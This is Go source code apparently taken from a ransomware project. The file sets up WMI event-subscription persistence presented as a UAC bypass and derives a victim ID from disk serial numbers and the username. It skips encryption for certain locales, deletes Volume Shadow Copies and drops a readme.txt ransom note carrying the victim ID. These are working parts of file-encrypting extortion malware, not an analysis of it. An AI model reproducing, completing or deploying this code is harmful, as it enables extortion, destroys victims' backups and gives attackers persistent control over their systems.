package main

import (
	"bytes"
	"encoding/gob"
	"errors"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/jaypipes/ghw"
	"github.com/jeandeaual/go-locale"
)

var VictimID string

// UAC Bypass + persistence.
// Provide path to current executable
func uacBypassPersist(path string) error {
	fPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	commands := []string{
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
		fmt.Sprintf("wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='GuacBypassConsumer', ExecutablePath='%s',CommandLineTemplate='%s'", fPath, fPath),
		"wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer'')",
	}

	for _, command := range commands {
		cmd := NewCmd(command)
		cmd.Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if _, err := cmd.Exec.Output(); err != nil {
			return err
		}

		// Check for 1 second before command execution.
		time.Sleep(time.Second)
	}
	return nil
}

// creating run-once file
func create_lock_file(filename string) (*os.File, error) {
	if _, err := os.Stat(filename); err == nil {
		err = os.Remove(filename)
		if err != nil {
			return nil, err
		}

	}
	return os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0666)
}

/* return (nil, false) if another instance is running
return (fileHandle, true) if no instance is running.

NOTE: Make sure to close and delete this file before exit.*/
func checkRunOnce(filename string) (*os.File, bool) {
	filePointer, err := create_lock_file(filename)

	if err != nil {
		// fmt.Println("someone is running")
		return nil, false
	}
	// filePointer, runOnceResult := checkRunOnce(LockFileName)
	// defer os.Remove(LockFileName) // defer executes backward
	// defer filePointer.Close()
	return filePointer, true
}

func generateVictimID() (string, error) {
	block, err := ghw.Block()
	if err != nil {
		return "", err
	}
	var victimID uint32 = 0
	for _, disk := range block.Disks {
		if victimID == 0 {
			victimID = crc32Checksum([]byte(disk.SerialNumber), 0xDEADBEEF)
		} else {
			victimID = crc32Checksum([]byte(disk.SerialNumber), victimID)
		}
	}
	user, err := user.Current()
	if err != nil {
		return "", err
	}
	victimID = crc32Checksum([]byte(user.Username), victimID)
	victimIDString := fmt.Sprintf("%08x", victimID)
	return strings.ToUpper(victimIDString), nil
}

// Check is false if language is not valid -> don't encrypt
func languageCheck() (bool, error) {
	userLocale, err := locale.GetLocale()
	if err != nil {
		return false, err
	}

	return userLocale != "en-US" && userLocale != "vi_VN", nil
}

func CloseHandle(mutexHandle uintptr) {
	syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(mutexHandle)
}

// Deleting Shadow Copies
func deleteShadowCopies() error {
	ole.CoInitialize(0)
	defer ole.CoUninitialize()

	pSWbemLocator, err := oleutil.CreateObject("WbemScripting.SWbemLocator")
	if err != nil {
		return err
	}
	defer pSWbemLocator.Release()

	wmi, err := pSWbemLocator.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return err
	}
	defer wmi.Release()

	// service is a SWbemServices
	serviceRaw, err := oleutil.CallMethod(wmi, "ConnectServer", nil, "ROOT\\CIMV2")
	if err != nil {
		return err
	}
	service := serviceRaw.ToIDispatch()
	defer service.Release()

	// result is a SShadowCopy
	resultRaw, err := oleutil.CallMethod(service, "ExecQuery", "SELECT * FROM Win32_ShadowCopy")
	if err != nil {
		return err
	}
	result := resultRaw.ToIDispatch()
	defer result.Release()

	countVar, err := oleutil.GetProperty(result, "Count")
	if err != nil {
		return err
	}
	count := int(countVar.Val)
	for i := 0; i < count; i++ {
		// item is a SWbemObject, but really a Win32_Process
		itemRaw, err := oleutil.CallMethod(result, "ItemIndex", i)
		if err != nil {
			return err
		}
		item := itemRaw.ToIDispatch()
		defer item.Release()

		shadowcopy_ID, err := oleutil.GetProperty(item, "ID")
		if err != nil {
			return err
		}
		_, err = oleutil.CallMethod(service, "DeleteInstance", shadowcopy_ID.ToString(), 0, 0, 0)
		if err != nil {
			// fmt.Println("delete instance fails")
			return err
		}
	}
	return nil
}

func encodeToBytes(p interface{}) []byte {

	buf := bytes.Buffer{}
	enc := gob.NewEncoder(&buf)
	err := enc.Encode(p)
	if err != nil {
		log.Fatal(err)
	}
	// fmt.Println("uncompressed size (bytes): ", len(buf.Bytes()))
	return buf.Bytes()
}

func decodeToEncryptedFileFooter(s []byte) EncryptedFileFooter {

	p := EncryptedFileFooter{}
	dec := gob.NewDecoder(bytes.NewReader(s))
	err := dec.Decode(&p)
	if err != nil {
		log.Fatal(err)
	}
	return p
}

// Return true if name is in hash list
func checkNameInHashList(name string, hashList []uint32) bool {
	nameHash := bufferHashing([]byte(strings.ToLower(name)))
	for _, hash := range hashList {
		if nameHash == hash {
			return true
		}
	}
	return false
}

func dropRansomNote(folderDir string) {
	if _, err := os.Stat(folderDir + "\\readme.txt"); !errors.Is(err, os.ErrNotExist) {
		// fmt.Println("Already exists", folderDir+"\\readme.txt")
		return
	}
	ransomNote, err := os.Create(folderDir + "\\readme.txt")

	if err != nil {
		// fmt.Println("Can't create")
		return
	}

	defer ransomNote.Close()
	victimID, _ := generateVictimID()
	strRansomNoteContent := fmt.Sprintf(string(GoCryptorConfig.ransomNoteContent), victimID, 0x69696969)
	_, err2 := ransomNote.WriteString(strRansomNoteContent)

	if err2 != nil {
		return
	}
}
